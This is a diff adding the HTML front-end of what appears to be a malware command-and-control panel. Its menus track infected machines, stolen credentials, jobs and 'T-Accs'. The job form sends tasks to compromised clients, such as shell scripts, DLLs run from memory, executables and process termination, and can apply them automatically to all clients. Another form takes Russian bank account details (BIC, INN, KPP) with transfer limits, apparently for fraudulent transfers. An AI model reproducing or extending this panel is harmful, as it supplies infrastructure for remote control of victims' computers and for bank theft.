@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+	<head>
+        <meta charset="utf-8">
+    	<title>cc</title>
+     	<link rel="stylesheet" href="bootstrap.min.css">
+     	<link rel="stylesheet" href="messi.min.css">
+     	<link rel="stylesheet" href="jquery-ui.min.css">
+     	<link rel="stylesheet" href="pnotify.custom.min.css">
+     	<link rel="stylesheet" href="my.css">
+     	<script src="jquery-1.11.2.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="bootstrap.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="jquery.jeditable.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="jquery-ui.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="messi.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="jquery.form.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="pnotify.custom.min.js" type="text/javascript" charset="utf-8"></script>
+     	<script src="main.js" type="text/javascript" charset="utf-8"></script>
+	</head>
+
+<body>
+
+ <nav class="navbar navbar-default">
+   <div class="container-fluid">
+     <div class="navbar-header">
+       <a class="navbar-brand" href="#">.::</a>
+     </div>
+
+     <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+       <ul class="nav navbar-nav" id="menu">
+         <li class="active"><a href="#" id="m_machines">Machines <span class="badge" id="b_machines"></span></a></li>
+         <li><a href="#" id="m_creds">Credentials <span class="badge" id="b_creds"></span></a></li>
+         <li><a href="#" id="m_jobs">Jobs <span class="badge" id="b_jobs"></span></a></li>
+         <li><a href="#" id="m_sqlog">SQ Log <span class="badge" id="b_sqlog"></span></a></li>
+         <li><a href="#" id="m_taccs">T-Accs <span class="badge" id="b_taccs"></span>&nbsp;<span class="badge" id="b_trans"></span></a></li>
+       </ul>
+
+       <ul class="nav navbar-nav navbar-right">
+     	 <li class="dropdown" id="bi_dropdown">
+     	 	<a class="dropdown-toggle" data-toggle="dropdown" href='#'>Build Id
+     	 	<span class="caret"></span>
+     	 	</a>
+	     	 	<ul class="dropdown-menu" id="bi_items">
+	     	 	</ul>
+     	 </li>
+
+         <li><a href="#" id="du_last">Online</a></li>
+       </ul>
+
+     </div>
+   </div>
+ </nav>
+
+<div id="addjob-dialog-form" title="Add new job">
+	<form method="post" enctype="multipart/form-data" action="ajax.php" id="newjob-form">
+	<fieldset>
+		<label>Memo</label>
+		<input type="text" name="memo" value="" class="text ui-widget-content ui-corner-all">
+		<label>Type</label>
+		<select size="1" name="ct" id="newjob-type-select" class="text ui-widget-content ui-corner-all">
+		  <option value="1" selected>Shell script</option>
+		  <option value="2">Run dll from memory</option>
+		  <option value="3">Run exe from disk (CreateProcess)</option>
+		  <option value="4">Run file from disk (ShellExecute)</option>
+		  <option value="5">Terminate host process (ExitProcess)</option>
+		</select><br><br>
+		<label>Assignment method</label>
+		<select size="1" name="at" id="newjob-asg-select" class="text ui-widget-content ui-corner-all">
+		  <option value="0" selected>Manual</option>
+		  <option value="1">Automatic</option>
+		</select>
+		<div id="add_to_existing" class="hidden">
+		<label class="checkbox-inline"><input name="ae" type="checkbox" value="1">Also assign to all already existing clients</label>
+		</div>
+		<br><br>
+        <label>Contents to be executed</label>
+        <div id="newjob-contents-div">according to selected command type</div>
+
+		<!-- Allow form submission with keyboard without duplicating the dialog button -->
+		<input type="submit" tabindex="-1" style="position:absolute; top:-1000px">
+	</fieldset>
+	</form>
+</div>
+
+<div id="addtacc-dialog-form" title="Add new t-acc">
+	<form method="post" enctype="multipart/form-data" action="ajax.php" id="newtacc-form">
+	<fieldset>
+
+		<label>Limits</label>
+		<div class="form-inline">
+			Range from <input type="text" size="4" maxlength="6" name="s_min" value="" class="form-control" /> K,
+			to <input type="text" size="4" maxlength="8" name="s_max" value="" class="form-control" /> K<br>
+			Max_sum <input type="text" size="4" maxlength="6" name="s_sum" value="" class="form-control" /> K,
+			Max_count <input type="text" size="2" maxlength="3" name="s_trc" value="" class="form-control" />
+		</div>
+
+		<br><label> | <a href='#' class='tacc-frm-switch'>Switch details type</a> | </label><br>
+
+		<input name="s_btype" type="hidden" value="2">
+
+		<div id="manual_add">
+		<label>Manual add</label>
+		BIC  <input type="text" tabindex="4" size="9" maxlength="9" name="s_bik" value="" class="form-control volatile" />
+		CorrespAcc <input type="text" tabindex="5" size="20" maxlength="20" name="s_ca" value="" class="form-control volatile" />
+		PersonalAcc <input type="text" tabindex="6" size="20" maxlength="20" name="s_pa" value="" class="form-control volatile" />
+		&nbsp;
+		<div class="form-inline">
+		    INN <input type="text" tabindex="7" size="10" maxlength="10" name="s_inn" value="" class="form-control volatile" />
+		    KPP <input type="text" tabindex="8" size="9" maxlength="9" name="s_kpp" value="" class="form-control volatile" />
+		</div>
+		Name <input type="text" tabindex="9" name="s_name" value="" class="form-control volatile" />
+		<label class="checkbox-inline"><input name="s_gp" type="checkbox" value="1">Generate purpose description</label>
+		</div>
+
+        <div id="bulk_add" class="hidden">
+		<label>Bulk file add</label>
+		<input name="upf" id="upf" type="file" value="" size="1">
+		</div>
+
+		<!-- Allow form submission with keyboard without duplicating the dialog button -->
+		<input type="submit" tabindex="-1" style="position:absolute; top:-1000px">
+	</fieldset>
+	</form>
+</div>
+
+
+<div id="listjobs-dialog" title="Jobs status">
+    <label>Machine id</label>
+    <div id="ljd-mid">AAABBBAAA</div>
+    <br>
+    <table class="table table-striped table-hover" id="jd_table">
+	  <thead>
+	    <tr>
+	      <th>rec_id</th>
+	      <th>Added</th>
+	      <th>Last stamp</th>
+	      <th>Cmd info</th>
+	      <th>Status</th>
+	      <th>Answer</th>
+	      <th>Controls</th>
+	    </tr>
+	  </thead>
+	  <tbody>
+         <tr><td  colspan="7">Loading...</td></tr>
+	  </tbody>
+	</table>
+	<h5>Note: Job status information in this dialog is not updated automatically</h5>
+</div>
+
+
+<div id="table_div">
+
+</div>
+
+
+
+
+
+</body>
+
+</html>
